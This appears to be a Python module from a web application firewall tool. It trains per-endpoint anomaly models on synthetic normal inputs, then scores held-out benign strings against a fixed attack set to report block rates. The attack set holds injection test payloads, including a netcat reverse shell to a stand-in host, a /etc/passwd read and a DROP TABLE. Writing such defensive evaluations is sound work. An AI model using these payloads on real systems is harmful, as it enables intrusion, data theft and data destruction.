"""Cyphex MCP — genome builder and its self-eval.

The genome is not trained on live traffic. The engine's BehavioralGenome profiles
each endpoint found by recon, fabricates realistic *normal* inputs for it, and fits
an Isolation Forest per endpoint, so whatever looks unlike that endpoint's normal
scores high at runtime. That is why a zero-day with no signature can still be
blocked, and why the only input it needs from an agent is the recon inventory:

    {"path": "/products/search", "method": "GET", "params": ["category", "minPrice"]}

Training needs numpy + scikit-learn + joblib, which the thin MCP image does not
carry. Without them build_genome returns status "unavailable" and says how to fix
it; it never pretends. The eval then scores attack and benign strings the genome
never saw in training and reports the real block and false-block rates, untuned.
"""
from __future__ import annotations

import hashlib
import json
import os
import sys
import zipfile
from pathlib import Path

from . import ledger

# Same thresholds as the live gate (backend/backend/config.py).
BLOCK, CHALLENGE = 0.7, 0.3

ATTACKS = {
    "sqli": ["' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT username,password FROM users--", "admin'--"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>", "javascript:alert(document.cookie)"],
    "path traversal": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"],
    "command injection": ["; cat /etc/passwd", "$(whoami)", "| nc attacker.example 4444 -e /bin/sh", "`id`"],
    "template injection": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
}
BENIGN = [
    "laptop", "blue dress size M", "john@example.com", "42", "O'Brien", "café near me",
    "2024-01-15", "alice.smith", "shoes size 10.5", "annual report Q3", "node.js tutorial",
    "meeting 3pm", "99.99", "María García", "sarah.connor@company.co", "red running shoes",
    "order 10482", "2025-11-30", "https://example.com/about", "Hans Müller", "invoice March",
    "7", "wireless mouse", "usa", "3.5 stars", "hello, how are you?", "price < 500",
    "user_2024", "Q4 budget review", "tomorrow at 10am",
]
CALIB, HELD_OUT = BENIGN[::2], BENIGN[1::2]  # thresholds are set on one half and judged on the other


def _backend_dir() -> Path:
    return Path(os.environ.get("CYPHEX_ENGINE_DIR") or Path(__file__).resolve().parents[1] / "backend" / "backend")


def _inventory_context(endpoints: list[dict], target_url: str):
    from models.scan import FormData, ParamData, ScanContext  # engine modules, see sys.path below
    ctx = ScanContext(target_url=target_url)
    for e in endpoints:
        path, params = e["path"], list(e.get("params") or [])
        ctx.all_endpoints.append(path)
        if str(e.get("method", "GET")).upper() == "GET":
            ctx.all_params += [ParamData(url=path, name=p) for p in params]
        else:
            ctx.all_forms.append(FormData(action=path, method=e["method"], inputs=params))
    return ctx


def build_genome(job_id: str, out_dir: str | None = None) -> dict:
    job = ledger.load_job(job_id)
    endpoints = job.get("endpoints") or []
    if not endpoints:
        raise ValueError("no recon inventory on this job; submit_result(role='recon') first")
    try:
        import joblib, numpy, sklearn  # noqa: F401
    except ImportError as e:
        res = {"status": "unavailable", "reason": f"{e.name} is not installed",
               "fix": "pip install numpy scikit-learn joblib, or run the MCP locally from a Cyphex install"}
        job["genome"] = res
        ledger.save_job(job)
        return res

    sys.path.insert(0, str(_backend_dir()))  # the engine's modules import each other top-level
    from immune.behavioral_genome import BehavioralGenome
    from immune.genome_bundle import export_genome, target_hash

    target = job.get("target_url") or f"local:{job.get('repo_path') or job_id}"  # one genome file per repo, not one per machine
    store = Path(out_dir) if out_dir else ledger.data_dir() / job_id / "genome"
    store.mkdir(parents=True, exist_ok=True)

    genome = BehavioralGenome()
    state = genome.build_from_scan(_inventory_context(endpoints, target))
    path = str(store / f"genome_{target_hash(target)}")
    genome.save(path)                       # joblib dump + HMAC signature + metadata
    reloaded = BehavioralGenome.load(path)  # load() refuses an unsigned or altered file
    bundle = export_genome(target, str(store), str(store / f"{job_id}.cxgenome"))

    tested = [e["path"] for e in endpoints if e.get("params")] or [endpoints[0]["path"]]
    score = lambda samples: [reloaded.score_request(ep, s) for ep in tested for s in samples]
    attacks = {cat: score(samples) for cat, samples in ATTACKS.items()}
    calib, held = score(CALIB), score(HELD_OUT)

    # The engine's default challenge threshold (0.3) sits below every normal input this model
    # scores, so with defaults EVERY normal request is flagged. Set the thresholds from the
    # model's own normal scores on the calibration half, then judge them on the held-out half.
    challenge = min(round(max(calib) + 0.03, 2), 0.95)
    block = max(BLOCK, round(challenge + 0.05, 2))

    def rates(ch, bl):
        flat = [x for v in attacks.values() for x in v]
        return {"attack_block_rate": round(sum(x >= bl for x in flat) / len(flat), 2),
                "attack_flag_rate": round(sum(x >= ch for x in flat) / len(flat), 2),
                "per_category_block": {c: round(sum(x >= bl for x in v) / len(v), 2) for c, v in attacks.items()},
                "normal_blocked_rate": round(sum(x >= bl for x in held) / len(held), 2),
                "normal_flagged_rate": round(sum(x >= ch for x in held) / len(held), 2),
                "thresholds": {"block": bl, "challenge": ch}}

    thresholds = store / "thresholds.json"
    thresholds.write_text(json.dumps({"challenge": challenge, "block": block, "calibrated_on": len(calib) * len(tested),
                                      "note": "set from this genome's own normal-input scores; re-calibrate on real traffic"}, indent=2))
    with zipfile.ZipFile(bundle, "a") as z:  # ship the thresholds inside the bundle too
        z.write(thresholds, "thresholds.json")
    files = sorted(str(p) for p in store.iterdir())
    res = {
        "status": "built",
        "at": ledger._now(),
        "endpoints_profiled": len(state.endpoints),
        "models_trained": len(genome.endpoint_models),
        "signed_and_reloads": True,
        "folder": str(store),
        "pkl": str(store / f"genome_{target_hash(target)}.pkl"),
        "bundle": bundle,
        "files": files,
        "bundle_sha256": hashlib.sha256(Path(bundle).read_bytes()).hexdigest()[:16],
        "eval": {
            **rates(challenge, block),
            "attack_samples": sum(len(v) for v in attacks.values()),
            "normal_samples": len(held),
            "with_engine_defaults": rates(CHALLENGE, BLOCK),
            "note": "Attacks were never in training data; the genome trains on synthetic normal inputs only",
        },
    }
    job["genome"] = res
    ledger.save_job(job)
    return res
